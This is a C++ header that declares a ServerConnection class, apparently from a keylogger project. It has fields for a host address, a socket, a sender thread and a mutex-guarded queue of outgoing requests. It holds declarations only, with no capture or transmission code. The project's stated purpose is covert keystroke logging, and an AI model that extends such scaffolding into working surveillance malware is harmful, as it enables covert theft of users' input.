#ifndef KEYLOGGER_SERVERCONNECTION_H
#define KEYLOGGER_SERVERCONNECTION_H

#include <string>
#include <thread>
#include <atomic>
#include <mutex>
#include <queue>
#include <functional>

#include "../server/ServerMain.hpp"

using namespace std;

class ServerConnection {
public:
    string HostAddr;
    string DisplayName;
    int FDConnection;
    function<bool()> isLoggedIn;
    thread* t_Sender;
    shared_ptr<atomic<bool>> f_Stop;
    queue<shared_ptr<Request>> OutgoingRequests;
    shared_ptr<mutex> m_OutgoingRequests;

    ServerConnection();
    ~ServerConnection();
    explicit ServerConnection(string addr);

    void Start();
    void Stop();
    void MakeRequest(const shared_ptr<Request>& req);

    void Setup();
    void PushReq(const shared_ptr<Request>& to_push);
    shared_ptr<Request> PopReq();
};


#endif //KEYLOGGER_SERVERCONNECTION_H
